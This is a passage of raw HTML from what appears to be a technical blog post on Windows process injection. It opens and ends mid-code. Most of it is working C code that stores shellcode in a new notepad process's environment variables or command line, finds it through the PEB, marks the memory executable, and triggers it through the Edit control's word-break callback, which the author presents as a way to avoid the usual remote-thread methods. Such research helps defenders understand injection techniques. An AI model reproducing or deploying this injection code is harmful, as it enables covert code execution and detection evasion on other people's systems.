block</span>\n<span style=\"color: #603000;\">DWORD</span> get_var_rva<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span> name<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">PVOID</span>  env<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PWCHAR</span> str<span style=\"color: #808030;\">,</span> var<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>  rva <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// find the offset of value for environment variable</span>\n    env <span style=\"color: #808030;\">=</span> NtCurrentTeb<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>ProcessEnvironmentBlock<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>ProcessParameters<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Environment<span style=\"color: #800080;\">;</span>\n    str <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span><span style=\"color: #808030;\">)</span>env<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">while</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">*</span>str <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// our name?</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">wcsncmp</span><span style=\"color: #808030;\">(</span>str<span style=\"color: #808030;\">,</span> name<span style=\"color: #808030;\">,</span> MAX_NAME_LEN<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        var <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">wcsstr</span><span style=\"color: #808030;\">(</span>str<span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">=</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #696969;\">// calculate RVA of value</span>\n        rva <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span>var <span style=\"color: #808030;\">-</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span>env<span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      <span style=\"color: #696969;\">// advance to next entry</span>\n      str <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">wcslen</span><span style=\"color: #808030;\">(</span>str<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> rva<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 00:49:23 UTC --></p>\n<p>Once we have the RVA for local process, read the address of environment block in remote process and add the RVA.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// get the address of environment block</span>\n<span style=\"color: #603000;\">PVOID</span> var_get_env<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">HANDLE</span> hp<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">PDWORD</span> envlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    NTSTATUS                    nts<span style=\"color: #800080;\">;</span>\n    PROCESS_BASIC_INFORMATION   pbi<span style=\"color: #800080;\">;</span>\n    RTL_USER_PROCESS_PARAMETERS upp<span style=\"color: #800080;\">;</span>\n    PEB                         peb<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                       len<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">SIZE_T</span>                      rd<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// get the address of PEB</span>\n    nts <span style=\"color: #808030;\">=</span> NtQueryInformationProcess<span style=\"color: #808030;\">(</span>\n        hp<span style=\"color: #808030;\">,</span> ProcessBasicInformation<span style=\"color: #808030;\">,</span>\n        <span style=\"color: #808030;\">&amp;</span>pbi<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>pbi<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>len<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the address RTL_USER_PROCESS_PARAMETERS</span>\n    <span style=\"color: #400000;\">ReadProcessMemory</span><span style=\"color: #808030;\">(</span>\n      hp<span style=\"color: #808030;\">,</span> pbi<span style=\"color: #808030;\">.</span>PebBaseAddress<span style=\"color: #808030;\">,</span>\n      <span style=\"color: #808030;\">&amp;</span>peb<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>PEB<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>rd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the address of Environment block </span>\n    <span style=\"color: #400000;\">ReadProcessMemory</span><span style=\"color: #808030;\">(</span>\n      hp<span style=\"color: #808030;\">,</span> peb<span style=\"color: #808030;\">.</span>ProcessParameters<span style=\"color: #808030;\">,</span>\n      <span style=\"color: #808030;\">&amp;</span>upp<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>RTL_USER_PROCESS_PARAMETERS<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>rd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #808030;\">*</span>envlen <span style=\"color: #808030;\">=</span> upp<span style=\"color: #808030;\">.</span>EnvironmentSize<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> upp<span style=\"color: #808030;\">.</span>Environment<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 00:51:54 UTC --></p>\n<p>The full routine will copy the user-supplied command to the Edit control and the shellcode will receive this when the word break callback is executed. You don&#8217;t need to use Notepad, but I just wanted to avoid the usual methods of executing code via RtlCreateUserThread or CreateRemoteThread. Figure 1 shows the shellcode stored as an environment variable. See <a href=\"https://github.com/odzhan/injection/tree/master/cmdline\">var_inject.c</a> for more detals.</p>\n<p><div class=\"wp-caption alignnone\" id=\"attachment_5049\" style=\"width: 588px;\"><img alt=\"\" class=\"size-full wp-image-5049\" height=\"165\" src=\"https://modexp.files.wordpress.com/2020/07/env_var.png\" width=\"578\" /><p class=\"wp-caption-text\" id=\"caption-attachment-5049\">Figure 1. Environment variable  of new process containing shellcode.</p></div></p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">void</span> var_inject<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span> cmd<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">STARTUPINFO</span>         si<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PROCESS_INFORMATION</span> pi<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>               name<span style=\"color: #808030;\">[</span>MAX_PATH<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">=</span><span style=\"color: #800080;\">{</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>    \n    <span style=\"color: #603000;\">INT</span>                 i<span style=\"color: #800080;\">;</span> \n    <span style=\"color: #603000;\">PVOID</span>               va<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>               rva<span style=\"color: #808030;\">,</span> old<span style=\"color: #808030;\">,</span> len<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>               env<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HWND</span>                npw<span style=\"color: #808030;\">,</span> ecw<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// generate random name</span>\n    <span style=\"color: #603000;\">srand</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">time</span><span style=\"color: #808030;\">(</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>MAX_NAME_LEN<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      name<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">rand</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">%</span> <span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">?</span> <span style=\"color: #0000e6;\">L'a'</span> <span style=\"color: #800080;\">:</span> <span style=\"color: #0000e6;\">L'A'</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">rand</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">%</span> <span style=\"color: #008c00;\">26</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// set variable in this process space with our shellcode</span>\n    <span style=\"color: #400000;\">SetEnvironmentVariable</span><span style=\"color: #808030;\">(</span>name<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span><span style=\"color: #808030;\">)</span>WINEXEC<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// create a new process using </span>\n    <span style=\"color: #696969;\">// environment variables from this process</span>\n    <span style=\"color: #400000;\">ZeroMemory</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>cb          <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>dwFlags     <span style=\"color: #808030;\">=</span> STARTF_USESHOWWINDOW<span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>wShowWindow <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">SW_SHOWDEFAULT</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #400000;\">CreateProcess</span><span style=\"color: #808030;\">(</span><span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">notepad</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> \n      FALSE<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>pi<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n     \n    <span style=\"color: #696969;\">// wait for process to initialize</span>\n    <span style=\"color: #696969;\">// if you don't wait, there can be a race condition</span>\n    <span style=\"color: #696969;\">// reading the correct Environment address from new process    </span>\n    <span style=\"color: #400000;\">WaitForInputIdle</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">,</span> INFINITE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// the command to execute is just pasted into the notepad</span>\n    <span style=\"color: #696969;\">// edit control.</span>\n    npw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindow</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Notepad</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    ecw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindowEx</span><span style=\"color: #808030;\">(</span>npw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Edit</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_SETTEXT</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span>cmd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the address of environment block in new process</span>\n    <span style=\"color: #696969;\">// then calculate the address of shellcode</span>\n    env <span style=\"color: #808030;\">=</span> var_get_env<span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>len<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    va <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span>env <span style=\"color: #808030;\">+</span> get_var_rva<span style=\"color: #808030;\">(</span>name<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// set environment block to RWX</span>\n    <span style=\"color: #400000;\">VirtualProtectEx</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">,</span> env<span style=\"color: #808030;\">,</span> \n      len<span style=\"color: #808030;\">,</span> PAGE_EXECUTE_READWRITE<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>old<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// execute shellcode</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETWORDBREAKPROC</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span>va<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_LBUTTONDBLCLK</span><span style=\"color: #808030;\">,</span> MK_LBUTTON<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span><span style=\"color: #008000;\">0x000a000a</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETWORDBREAKPROC</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span><span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n<span style=\"color: #e34adc;\">cleanup:</span>\n    <span style=\"color: #696969;\">// cleanup and exit</span>\n    <span style=\"color: #400000;\">SetEnvironmentVariable</span><span style=\"color: #808030;\">(</span>name<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hThread<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-25 11:22:25 UTC --></p>\n<h2 id=\"cmd\">4. Command Line</h2>\n<p>This can be easier to work with than environment variables. For this example, only the shellcode itself is used and that can be located easily in the PEB.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #004a43;\">    </span><span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> NOTEPAD_PATH </span><span style=\"color: #800000;\">L\"</span><span style=\"color: #007997;\">%S</span><span style=\"color: #0000e6;\">ystemRoot%</span><span style=\"color: #0f69ff;\">\\\\</span><span style=\"color: #0000e6;\">system32</span><span style=\"color: #0f69ff;\">\\\\</span><span style=\"color: #0000e6;\">notepad.exe</span><span style=\"color: #800000;\">\"</span>\n\n    <span style=\"color: #400000;\">ExpandEnvironmentStrings</span><span style=\"color: #808030;\">(</span>NOTEPAD_PATH<span style=\"color: #808030;\">,</span> path<span style=\"color: #808030;\">,</span> MAX_PATH<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// create a new process using shellcode as command line</span>\n    <span style=\"color: #400000;\">ZeroMemory</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>cb          <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>dwFlags     <span style=\"color: #808030;\">=</span> STARTF_USESHOWWINDOW<span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>wShowWindow <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">SW_SHOWDEFAULT</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #400000;\">CreateProcess</span><span style=\"color: #808030;\">(</span>path<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span><span style=\"color: #808030;\">)</span>WINEXEC<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> \n      FALSE<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>pi<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 01:05:40 UTC --></p>\n<p>Reading is much the same as reading environment variables since they both reside inside RTL_USER_PROCESS_PARAMETERS.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// get the address of command line</span>\n<span style=\"color: #603000;\">PVOID</span> get_cmdline<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">HANDLE</span> hp<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">PDWORD</span> cmdlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    NTSTATUS                    nts<span style=\"color: #800080;\">;</span>\n    PROCESS_BASIC_INFORMATION   pbi<span style=\"color: #800080;\">;</span>\n    RTL_USER_PROCESS_PARAMETERS upp<span style=\"color: #800080;\">;</span>\n    PEB                         peb<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                       len<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">SIZE_T</span>                      rd<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// get the address of PEB</span>\n    nts <span style=\"color: #808030;\">=</span> NtQueryInformationProcess<span style=\"color: #808030;\">(</span>\n        hp<span style=\"color: #808030;\">,</span> ProcessBasicInformation<span style=\"color: #808030;\">,</span>\n        <span style=\"color: #808030;\">&amp;</span>pbi<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>pbi<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>len<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the address RTL_USER_PROCESS_PARAMETERS</span>\n    <span style=\"color: #400000;\">ReadProcessMemory</span><span style=\"color: #808030;\">(</span>\n      hp<span style=\"color: #808030;\">,</span> pbi<span style=\"color: #808030;\">.</span>PebBaseAddress<span style=\"color: #808030;\">,</span>\n      <span style=\"color: #808030;\">&amp;</span>peb<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>PEB<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>rd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the address of command line </span>\n    <span style=\"color: #400000;\">ReadProcessMemory</span><span style=\"color: #808030;\">(</span>\n      hp<span style=\"color: #808030;\">,</span> peb<span style=\"color: #808030;\">.</span>ProcessParameters<span style=\"color: #808030;\">,</span>\n      <span style=\"color: #808030;\">&amp;</span>upp<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>RTL_USER_PROCESS_PARAMETERS<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>rd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #808030;\">*</span>cmdlen <span style=\"color: #808030;\">=</span> upp<span style=\"color: #808030;\">.</span>CommandLine<span style=\"color: #808030;\">.</span>Length<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> upp<span style=\"color: #808030;\">.</span>CommandLine<span style=\"color: #808030;\">.</span>Buffer<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 01:06:28 UTC --></p>\n<p>Figure 2 illustrates what Process Explorer might show for the new process. See <a href=\"https://github.com/odzhan/injection/tree/master/cmdline\">cmd_inject.c</a> for more detals.</p>\n<p><div class=\"wp-caption alignnone\" id=\"attachment_5051\" style=\"width: 588px;\"><img alt=\"\" class=\"size-full wp-image-5051\" height=\"219\" src=\"https://modexp.files.wordpress.com/2020/07/cmdline.png\" width=\"578\" /><p class=\"wp-caption-text\" id=\"caption-attachment-5051\">Figure 2. Command line of new process containing shellcode.</p></div></p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> NOTEPAD_PATH </span><span style=\"color: #800000;\">L\"</span><span style=\"color: #007997;\">%S</span><span style=\"color: #0000e6;\">ystemRoot%</span><span style=\"color: #0f69ff;\">\\\\</span><span style=\"color: #0000e6;\">system32</span><span style=\"color: #0f69ff;\">\\\\</span><span style=\"color: #0000e6;\">notepad.exe</span><span style=\"color: #800000;\">\"</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span> cmd_inject<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span> cmd<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">STARTUPINFO</span>         si<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PROCESS_INFORMATION</span> pi<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>               path<span style=\"color: #808030;\">[</span>MAX_PATH<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">=</span><span style=\"color: #800080;\">{</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>               rva<span style=\"color: #808030;\">,</span> old<span style=\"color: #808030;\">,</span> len<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>               cmdline<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HWND</span>                npw<span style=\"color: #808030;\">,</span> ecw<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #400000;\">ExpandEnvironmentStrings</span><span style=\"color: #808030;\">(</span>NOTEPAD_PATH<span style=\"color: #808030;\">,</span> path<span style=\"color: #808030;\">,</span> MAX_PATH<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// create a new process using shellcode as command line</span>\n    <span style=\"color: #400000;\">ZeroMemory</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>cb          <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>dwFlags     <span style=\"color: #808030;\">=</span> STARTF_USESHOWWINDOW<span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>wShowWindow <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">SW_SHOWDEFAULT</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #400000;\">CreateProcess</span><span style=\"color: #808030;\">(</span>path<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span><span style=\"color: #808030;\">)</span>WINEXEC<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> \n      FALSE<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span 